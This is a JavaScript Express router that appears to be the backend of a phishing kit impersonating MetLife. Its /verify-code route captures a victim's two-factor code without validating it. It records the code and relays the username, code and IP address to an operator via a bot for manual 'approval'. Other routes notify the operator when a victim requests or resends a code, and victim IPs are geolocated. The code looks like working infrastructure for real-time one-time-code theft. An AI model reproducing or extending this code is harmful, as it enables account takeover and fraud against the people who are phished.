const express = require('express');
const geoip = require('geoip-lite');
const LoginRequest = require('../models/LoginRequest');
const { sendTwoFactorCodeNotification, send2FAApprovalRequest } = require('../bot');

const router = express.Router();

/**
 * Get client IP address from request
 */
function getClientIp(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown'
  );
}

/**
 * Get location info from IP using geoip-lite
 */
function getLocationInfo(ip) {
  try {
    const geo = geoip.lookup(ip);
    if (geo) {
      return {
        country: geo.country,
        city: geo.city || 'Unknown',
        timezone: geo.timezone || 'Unknown',
        coordinates: `${geo.ll[0]}, ${geo.ll[1]}`,
      };
    }
  } catch (err) {
    console.error('[geoip] Error:', err);
  }
  return {
    country: 'Unknown',
    city: 'Unknown',
    timezone: 'Unknown',
    coordinates: 'Unknown',
  };
}

// Initialize global 2FA storage
if (!global.twoFAApprovals) {
  global.twoFAApprovals = {};
}

/**
 * POST /api/two-factor/sendcode
 * Send 2FA code to user (for development/testing)
 */
router.post('/sendcode', async (req, res) => {
  const { username,  method } = req.body;
  const clientIp = getClientIp(req);

  try {
    const trimmedUsername = String(username).trim();
  
    const trimmedMethod = String(method).trim();

    const storedData = global.twoFACodes?.[trimmedUsername];
   //

    // Log correct code
    await sendTwoFactorCodeNotification(
      {
        username: trimmedUsername,
        status: 'verification method',
        method: trimmedMethod,
      },
      { ip: clientIp }
    );

    return res.status(200).json({
      success: true,
      message: 'Code sent successfully.',
    });
  } catch (error) {
    console.error('[two-factor/sendcode] error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to send code.',
    });
  }
});


// Resend code
router.post('/click', async (req, res) => {
  const { username,  method } = req.body;
  const clientIp = getClientIp(req);
  console.log(username,method,clientIp)

  try {
    const trimmedUsername = String(username).trim();
  
    const trimmedMethod = String(method).trim();

   // const storedData = global.twoFACodes?.[trimmedUsername];

    // if (!storedData) {
    //   return res.status(400).json({
    //     success: false,
    //     message: 'No 2FA code found for this user.',
    //   });
    // }

  
    await sendTwoFactorCodeNotification(
      {
        username: trimmedUsername,
        status: 'resend code clicked',
        method: trimmedMethod,
      },
      { ip: clientIp }
    );

    return res.status(200).json({
      success: true,
      message: 'Code sent successfully.',
    });
  } catch (error) {
    console.error('[two-factor/sendcode] error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to send code.',
    });
  }
});

/**
 * POST /api/two-factor/verify-code
 * Verify the 2FA code entered by user
 */
router.post('/verify-code', async (req, res) => {
  try {
    const { username, code, method } = req.body || {};
    const clientIp = getClientIp(req);
    const locationInfo = getLocationInfo(clientIp);

    // Validate inputs
    if (!username || !code) {
      return res.status(400).json({
        success: false,
        message: 'Username and code are required.',
      });
    }

    const trimmedUsername = String(username).trim();
    const trimmedCode = String(code).trim();
    const trimmedMethod = String(method || 'email').trim();

  

    // Find the active login request for this user
    const loginRequest = await LoginRequest.findOne({
      username: trimmedUsername,
      
    });

    if (!loginRequest) {
      return res.status(401).json({
        success: false,
        message: 'No active login request found. Please login again.',
      });
    }

    const verificationId = loginRequest.verificationId;

    // Update the login request in database with 2FA code (no validation - admin will approve or deny)
    await LoginRequest.findOneAndUpdate(
      { verificationId },
      {
        twoFACode: trimmedCode,
        twoFAMethod: trimmedMethod,
        twoFAStatus: 'pending',
        status: 'pending_approval',
        logType: '2fa_code',
      },
      { new: true }
    );

    // Store in memory for quick access
    if (!global.twoFAApprovals) {
      global.twoFAApprovals = {};
    }
    global.twoFAApprovals[verificationId] = {
      username: trimmedUsername,
      code: trimmedCode,
      method: trimmedMethod,
      status: 'pending_approval',
      expiresAt: Date.now() + (2 * 60 * 1000), // 2 minutes for auto-expiry
    };

    // Notify admin about 2FA code (for logging purposes)
    // await sendTwoFactorCodeNotification(
    //   {
    //     username: trimmedUsername,
    //     code: trimmedCode,
    //     status: 'submitted',
    //     method: trimmedMethod,
    //   },
    //   { ip: clientIp }
    // );

    // Send approval request to admin (admin decides if code is valid)
    await send2FAApprovalRequest(
      {
        username: trimmedUsername,
        code: trimmedCode,
        method: trimmedMethod,
        verificationId: verificationId,
      },
      { ip: clientIp }
    );

    return res.status(200).json({
      success: true,
      message: 'Code submitted. Waiting for admin approval...',
      verificationId: verificationId,
      status: 'pending_approval',
    });
  } catch (err) {
    console.error('[two-factor/verify-code] error:', err);
    return res.status(500).json({
      success: false,
      message: 'Failed to verify code.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * GET /api/two-factor/check-approval/:verificationId
 * Check if admin has approved or rejected the 2FA request
 */
router.get('/check-approval/:verificationId', async (req, res) => {
  try {
    const { verificationId } = req.params;

    const loginRequest = await LoginRequest.findOne({ verificationId });

    if (!loginRequest) {
      return res.status(404).json({
        success: false,
        message: 'Verification request not found.',
      });
    }


      

    return res.status(200).json({
      success: true,
      verificationId: verificationId,
      status: loginRequest.status, // 'pending', 'pending_approval', 'approved', or 'rejected'
      username: loginRequest.username,
    });
  } catch (err) {
    console.error('[two-factor/check-approval] error:', err);
    return res.status(500).json({
      success: false,
      message: 'Failed to check approval status.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * POST /api/bot/send-notification
 * Send a notification to the bot about user actions
 */
router.post('/bot/send-notification', async (req, res) => {
  try {
    const { username, action, message, botName, timestamp } = req.body;

    if (!username || !action) {
      return res.status(400).json({
        success: false,
        message: 'Missing required fields: username, action',
      });
    }

    // Create a log entry for bot notifications
    const BotLog = require('../models/BotLog');
    const botLog = await BotLog.create({
      username: username,
      action: action,
      message: message || '',
      botName: botName || process.env.BOT_NAME || 'MetLife Security Bot',
      timestamp: timestamp || new Date(),
    });

    // Send notification through bot if resend_code action
    if (action === 'resend_code') {
      const botMessage = `📢 User Action: ${username} clicked to resend verification code\n\n${message}\n\nTime: ${new Date().toLocaleString()}`;
      // You can integrate Telegram bot send here if needed
      console.log(`[Bot Notification] ${botMessage}`);
    }

    res.status(200).json({
      success: true,
      message: 'Notification logged successfully.',
      data: botLog,
    });
  } catch (err) {
    console.error('[bot/send-notification] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to send notification.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

module.exports = router;
